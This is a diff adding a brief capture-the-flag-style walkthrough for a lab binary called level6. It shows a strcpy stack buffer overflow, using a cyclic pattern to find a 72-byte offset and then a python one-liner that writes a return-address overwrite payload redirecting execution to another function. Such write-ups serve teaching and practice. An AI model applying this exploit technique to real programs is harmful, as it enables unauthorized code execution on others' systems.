@@ -1,0 +1,10 @@
+## Level 6
+
+Were we use strcpy, that is deprecated because don't check the length max of the arg and that can overflow.   
+Let's make overflow, to do that we use a overflow pattern generator :   
+`home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
+
+The overflow send the address 0x41346341 that is the 72 caracteres, thx https://wiremask.eu/tools/buffer-overflow-pattern-generator/?  
+
+So let's try to put the address of the n function in it, :
+python -c 'print("A" * 72 + "\x54\x84\x04\x08")' > /tmp/exploit6
